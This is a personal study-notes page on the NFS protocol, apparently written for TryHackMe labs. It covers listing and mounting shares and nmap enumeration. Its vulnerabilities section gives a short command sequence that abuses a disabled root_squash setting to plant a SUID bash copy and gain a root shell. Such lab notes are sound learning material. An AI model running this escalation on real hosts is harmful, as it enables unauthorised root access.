# Network File System (NFS)

[![networkservices2](../../../cybersecurity/_badges/thmp/networkservices2.svg)](https://tryhackme.com/room/networkservices2)

<div class="row row-cols-md-2 mt-2"><div>

Network File System (NFS) is a protocol allowing a computer to mount a remote folder on its local file system.

🐊️ **Port**: 2049 (TCP)

Remote Procedure Calls (RPC) are used to exchange with the server.

**List mounts** 🗺️

```ps
$ showmount -e IP
# see NFS exports
$ cat /etc/exports
```
</div><div>

**Mount/Unmount** 🤘

The command below will mount the remote folder `/share` inside `/tmp/share` on our machine. It means that when we browse `/tmp/share`, we will see the files inside `/share` on the remote host.

```ps
#  sudo apt install nfs-common
$ mkdir /tmp/share
$ sudo mount -t nfs IP:/share /tmp/share/ -nolock
# there is also variants (with/without vers=2): 
# sudo mount -o rw,vers=2 IP:/share /tmp/share/
# unmount
$ sudo umount /tmp/share
```
</div></div>

<hr class="sep-both">

## NFS vulnerabilities ☠️

[![linprivesc](../../../cybersecurity/_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linuxprivesc](../../../cybersecurity/_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![kenobi](../../../cybersecurity/_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

* It's possible to use `nmap` to get information about NFS shares:

```ps
$ nmap IP -p 2049 --script=nfs-ls,nfs-statfs,nfs-showmount
```
</div><div>

* When **root_squashing** is disabled, a local root user is mapped to the remote root user, allowing them to create [SUID](/cybersecurity/red-team/s4.privesc/linux/perms.md#suidguid-bit) files.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

NFS

* nfs-utils
* rpcinfo
* nfsstat
* nfswatch
* DoS
</div><div>
</div></div>